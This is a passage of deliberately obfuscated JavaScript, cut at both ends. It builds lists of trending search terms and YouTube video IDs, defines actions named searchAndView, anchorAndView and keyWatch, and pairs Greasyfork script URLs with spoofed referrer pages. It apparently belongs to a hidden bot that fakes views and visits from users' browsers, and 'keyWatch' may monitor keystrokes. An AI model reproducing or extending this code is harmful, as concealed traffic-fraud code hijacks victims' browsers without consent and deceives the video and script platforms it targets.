'\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x53 * 0x65 + -0x5 * 0x116 + 0x2637)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xc71 + -0x281 + 0xefc)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * -0x7d3 + -0x81c + 0xff2);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    U(0xb) + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    V(0xa, 'xWhx') + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    U(0x1) + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0x4) + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x9, 'gFaT') + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': U(0x0) + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + W(0x8) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x3, 'I7N[') + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + U(0x10) + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
